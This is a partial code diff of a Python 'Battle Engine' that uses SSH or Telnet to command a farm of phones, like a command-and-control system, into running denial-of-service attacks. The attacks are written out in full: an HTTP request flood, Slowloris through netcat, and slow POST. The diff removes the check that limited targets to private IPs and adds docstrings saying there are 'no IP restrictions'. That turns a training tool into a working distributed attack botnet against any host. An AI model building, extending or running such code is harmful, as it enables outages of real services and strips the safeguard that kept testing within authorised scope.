-        
-        \x03 is the ASCII code for Ctrl+C in Telnet.
+            SSH: Send pkill command to kill leftover processes
+            Telnet: Send Ctrl+C (\x03) + pkill command
         """
-        if not self.connected or not self.tn:
+        if not self.connected or not self.conn:
             return
         try:
-            # Send Ctrl+C signal twice
-            self.tn.write(b"\x03")     # \x03 = Ctrl+C in Telnet protocol
-            time.sleep(0.2)
-            self.tn.write(b"\x03")     # Send again to be sure
-            time.sleep(0.2)
-            
-            # Kill any remaining curl/wget processes that might still be running
-            # pkill -f kills processes matching the pattern
-            self.tn.write(b"pkill -f 'curl.*zylon' 2>/dev/null; pkill -f 'wget.*zylon' 2>/dev/null\n")
-            time.sleep(0.3)
+            if self.protocol == "ssh":
+                self.conn.send_stop()
+            else:
+                # Telnet: Send Ctrl+C signal twice
+                self.conn.write(b"\x03")     # \x03 = Ctrl+C
+                time.sleep(0.2)
+                self.conn.write(b"\x03")     # Double tap
+                time.sleep(0.2)
+                # Kill any remaining processes
+                self.conn.write(b"pkill -f 'curl.*zylon' 2>/dev/null; pkill -f 'curl.*ZYLONAcademy' 2>/dev/null; pkill -f 'wget.*zylon' 2>/dev/null\n")
+                time.sleep(0.3)
             
             self.busy = False
             self.last_status = "Stopped"
@@ -281,11 +856,14 @@ class TelnetAgent:
         Gracefully disconnect from this phone.
         Sends stop signal first, then logs out and closes connection.
         """
-        self.send_stop()  # Make sure nothing is running
+        self.send_stop()
         try:
-            if self.tn:
-                self.tn.write(b"exit\n")  # Log out of Telnet session
-                self.tn.close()           # Close the connection
+            if self.conn:
+                if self.protocol == "ssh":
+                    self.conn.close()
+                else:
+                    self.conn.write(b"exit\n")
+                    self.conn.close()
         except Exception:
             pass
         self.connected = False
@@ -302,20 +880,29 @@ class TelnetAgent:
 #   - Runs the 4 battle phases (recon, flood, slowloris, slowpost)
 #   - Tracks statistics (requests sent, blocked, etc.)
 #   - Has emergency stop functionality
+#   - Supports BOTH SSH and Telnet protocols
 
 class BattleEngine:
     """
     Academy Battle Engine - Red Team vs Blue Team Controller.
     
     ARCHITECTURE:
-        ZYLON (controller) ──Telnet──→ Phone 1 ──curl──→ Target
-                                ├──Telnet──→ Phone 2 ──curl──→ Target
-                                └──Telnet──→ Phone 3 ──curl──→ Target
+        ZYLON (controller) --SSH/Telnet--> Phone 1 --curl--> Target
+                                |--SSH/Telnet--> Phone 2 --curl--> Target
+                                +--SSH/Telnet--> Phone 3 --curl--> Target
     
     The controller never sends traffic directly to the target.
     It only tells the phones WHAT to do, and they do it.
-    This is the same pattern as a real C2 (Command & Control) system,
-    but restricted to YOUR local network only.
+    This is the same pattern as a real C2 (Command & Control) system.
+    
+    PROTOCOLS:
+        - SSH (port 22/8022): Secure, default on Termux
+        - Telnet (port 23): Unencrypted, for older setups
+        Auto-detected from port number when you add an agent.
+    
+    NETWORK:
+        Works on ANY network - local WiFi, cellular data, VPN, etc.
+        No IP restrictions. You control which phones you add.
     """
     
     def __init__(self):
@@ -342,23 +929,31 @@ class BattleEngine:
         """
         Add a phone to the farm.
         
-        SECURITY CHECK: Only allows private/local IPs.
-        If someone tries to add 8.8.8.8 or any public IP, it gets BLOCKED.
-        This prevents accidental (or intentional) use against non-local targets.
-        """
-        # Security gate - reject non-local IPs
-        if not is_private_ip(host):
-            return False, f"BLOCKED: {host} is not a local/private IP. Battle Mode only works on YOUR local network."
+        NO IP RESTRICTIONS:
+            Works on ANY network - local WiFi, cellular data, VPN.
+            Your phones may be on different networks, that's fine.
+            You are responsible for adding the right phones.
         
+        AUTO-DETECT PROTOCOL:
+            Port 22 or 8022 -> SSH (MiniSSH)
+            Any other port -> Telnet (MiniTelnet)
+        """
         agent_id = len(self.agents) + 1  # Auto-number: 1, 2, 3...
         agent = TelnetAgent(host, port, username, password, agent_id)
         self.agents.append(agent)
-        return True, f"Agent {agent_id} added ({host}:{port})"
+        proto_label = "SSH" if agent.protocol == "ssh" else "Telnet"
+        return True, f"Agent {agent_id} added ({host}:{port} [{proto_label}])"
     
     def connect_all(self):
         """
         Connect to ALL registered agents at once.
-        Returns a list of results showing which phones connected and which failed.
+        
+        For each agent:
+            1. First check if port is open (quick diagnostic)
+            2. Try to connect via SSH or Telnet
+            3. Return results showing which phones connected and which failed
+        
+        Returns: (any_connected_bool, list_of_results)
         """
         if not self.agents:
             return False, "No agents registered"
@@ -367,8 +962,8 @@ class BattleEngine:
         connected = 0
         
         for agent in self.agents:
-            success, msg = agent.connect(timeout=8)
-            results.append((agent.agent_id, agent.host, success, msg))
+            success, msg = agent.connect(timeout=10)
+            results.append((agent.agent_id, agent.host, agent.protocol, success, msg))
             if success:
                 connected += 1
         
@@ -383,8 +978,8 @@ class BattleEngine:
         self._stop_flag.set()   # Signal all threads to stop
         self.running = False
         for agent in self.agents:
-            agent.send_stop()     # Send Ctrl+C to each phone
-            agent.disconnect()    # Close Telnet connection
+            agent.send_stop()     # Send Ctrl+C/pkill to each phone
+            agent.disconnect()    # Close connection
     
     # ========================================================================
     # COMMAND BUILDERS
@@ -409,14 +1004,14 @@ class BattleEngine:
             done
         
         BREAKDOWN:
-            - for i in $(seq 1 N)    → Loop N times
-            - curl -s                → Silent mode (no progress bar)
-            - -o /dev/null           → Don't save response body
-            - -w '%{http_code}'      → Only print HTTP status code (200, 403, etc.)
-            - -X GET                 → HTTP method
-            - ?zylon=$RANDOM         → Random URL parameter (bypasses caching)
-            - 2>/dev/null            → Hide error messages
-            - sleep 0.1              → Small delay between requests
+            - for i in $(seq 1 N)    -> Loop N times
+            - curl -s                -> Silent mode (no progress bar)
+            - -o /dev/null           -> Don't save response body
+            - -w '%{http_code}'      -> Only print HTTP status code (200, 403, etc.)
+            - -X GET                 -> HTTP method
+            - ?zylon=$RANDOM         -> Random URL parameter (bypasses caching)
+            - 2>/dev/null            -> Hide error messages
+            - sleep 0.1              -> Small delay between requests
         
         $RANDOM is a bash variable that generates a random number each time.
         This makes every request unique so the server can't cache it.
@@ -488,7 +1083,7 @@ class BattleEngine:
         
         HOW SLOWLORIS WORKS:
             1. Open TCP connection to target
-            2. Send partial HTTP headers (missing the final \r\n\r\n)
+            2. Send partial HTTP headers (missing the final \\r\\n\\r\\n)
             3. Server waits for the rest of the request...
             4. Every few seconds, send another header line (keep-alive)
             5. Server keeps waiting... holding a worker thread open
@@ -496,18 +1091,18 @@ class BattleEngine:
                150 slow connections = server can't serve anyone else
         
         THE COMMAND (simplified):
-            echo -ne 'GET / HTTP/1.1\r\nHost: target\r\nX-Keep: alive\r\n'
-            sleep 3  ← wait 3 seconds (server is still waiting for complete request)
-            echo -ne 'X-Keep: alive\r\n'  ← send another header to keep connection alive
+            echo -ne 'GET / HTTP/1.1\\r\\nHost: target\\r\\nX-Keep: alive\\r\\n'
+            sleep 3  <- wait 3 seconds (server is still waiting for complete request)
+            echo -ne 'X-Keep: alive\\r\\n'  <- send another header to keep connection alive
             sleep 3
-            echo -ne 'X-Keep: alive\r\n'
+            echo -ne 'X-Keep: alive\\r\\n'
         
         Pipe this into nc (netcat) which sends it to the target.
         The & at the end runs each connection in the background.
         """
         cmd = (
             f"for i in $(seq 1 {count}); do "
-            # Open slow connection - send partial headers (NO \r\n\r\n at end)
+            # Open slow connection - send partial headers (NO \\r\\n\\r\\n at end)
             f"(echo -ne 'GET /slowloris-test-{random.randint(1000,9999)} HTTP/1.1\\r\\n"
             f"Host: {target_host}\\r\\n"
             f"User-Agent: ZYLONAcademy-RedTeam\\r\\n"
@@ -555,6 +1150,7 @@ class BattleEngine:
             result_list.append({
                 'agent_id': agent.agent_id,
                 'host': agent.host,
+                'protocol': agent.protocol,
                 'success': success,
                 'response': response[:500] if response else "",  # Limit response size
             })
@@ -603,8 +1199,8 @@ class BattleEngine:
         This tests if the target is alive and responding normally.
         Good for checking: Is the target up? What status codes does it return?
         
-        If even 5 requests get blocked → target has aggressive rate limiting.
-        If all 5 succeed → target has NO basic protection.
+        If even 5 requests get blocked -> target has aggressive rate limiting.
+        If all 5 succeed -> target has NO basic protection.
         """
         self._stop_flag.clear()  # Reset stop flag for new phase
         self.stats['phases_run'] += 1
@@ -649,12 +1245,12 @@ class BattleEngine:
         This simulates a real Layer 7 DDoS flood attack.
         Blue team should see their rate limiting kick in.
         
-        IF: >10% requests blocked → Blue team defense is working
-        IF: <10% blocked → Target is vulnerable to flood attacks
+        IF: >10% requests blocked -> Blue team defense is working
+        IF: <10% blocked -> Target is vulnerable to flood attacks
         
         MATH:
-            5 phones × 50 requests = 250 requests total
-            If target blocks after 30 requests → block rate = 30/250 = 12%
+            5 phones x 50 requests = 250 requests total
+            If target blocks after 30 requests -> block rate = 30/250 = 12%
             That means rate limiting IS working (good for blue team)
         """
         self._stop_flag.clear()
@@ -714,7 +1310,7 @@ class BattleEngine:
             HAProxy: timeout client 10s, timeout http-request 5s
         
         If blue team configures these correctly, slow connections get dropped.
-        If NOT configured → slow connections stay open → server can't serve real users.
+        If NOT configured -> slow connections stay open -> server can't serve real users.
         """
         self._stop_flag.clear()
         self.stats['phases_run'] += 1
@@ -774,15 +1370,13 @@ class BattleEngine:
             
             if agent.os_type == "termux":
                 # Termux: Use netcat to send raw POST with slow data
-                # This sends headers first, then body data very slowly
                 cmd = (
                     f"for i in $(seq 1 {connections_per_agent}); do "
                     f"(echo -ne 'POST /slowpost-test HTTP/1.1\\r\\n"
                     f"Host: {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url}\\r\\n"
                     f"Content-Type: application/x-www-form-urlencoded\\r\\n"
-                    f"Content-Length: 65536\\r\\n"  # Tell server to expect 64KB
+                    f"Content-Length: 65536\\r\\n"
                     f"Connection: keep-alive\\r\\n\\r\\n'; "
-                    # Send body data very slowly - 16 bytes every 0.5 seconds
                     f"for j in $(seq 1 100); do "
                     f"echo -ne 'A=AAAAAAAAAAAAAAAA'; sleep 0.5; "
                     f"done) | nc -w 30 {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url} 80 2>/dev/null & "
@@ -795,7 +1389,7 @@ class BattleEngine:
                     f"curl -s -X POST '{target_url}/slowpost-test' "
                     f"-H 'Content-Type: application/x-www-form-urlencoded' "
                     f"-H 'Transfer-Encoding: chunked' "
-                    f"--limit-rate 16 -d 'A=AAAA' "  # Limit to 16 bytes/sec
+                    f"--limit-rate 16 -d 'A=AAAA' "
                     f"--max-time 30 2>/dev/null; "
                     f"done; echo 'DONE'"
                 )
@@ -822,6 +1416,7 @@ class BattleEngine:
                 'id': agent.agent_id,
                 'host': agent.host,
                 'port': agent.port,
+                'protocol': agent.protocol,
                 'connected': agent.connected,
                 'os_type': agent.os_type,
                 'busy': agent.busy,
@@ -839,7 +1434,6 @@ class BattleEngine:
         return {
             **self.stats,
             'elapsed_seconds': elapsed,
-            # Requests per second = total requests / elapsed time
             'requests_per_second': round(self.stats['total_requests'] / max(elapsed, 1), 1),
             'agents_total': len(self.agents),
             'agents_active': sum(1 for a in self.agents if a.connected)
@@ -848,7 +1442,7 @@ class BattleEngine:
     def display_dashboard(self):
         """
         Display a live battle dashboard showing:
-            - Agent table: which phones are connected, their OS, status
+            - Agent table: which phones are connected, protocol, OS, status
             - Stats panel: total requests, blocked rate, requests/sec
         
         This is what blue team and red team see during the exercise.
@@ -862,15 +1456,17 @@ class BattleEngine:
         )
         agent_table.add_column("ID", style="yellow", width=4)
         agent_table.add_column("Host", style="cyan", width=18)
+        agent_table.add_column("Proto", style="magenta", width=6)
         agent_table.add_column("OS", style="green", width=8)
         agent_table.add_column("Connected", style="green", width=10)
-        agent_table.add_column("Status", style="white", width=15)
+        agent_table.add_column("Status", style="white", width=20)
         
         for agent in self.agents:
             conn = "YES" if agent.connected else "NO"
             agent_table.add_row(
                 str(agent.agent_id),
                 f"{agent.host}:{agent.port}",
+                agent.protocol.upper(),
                 agent.os_type or "?",
                 conn,
                 agent.last_status
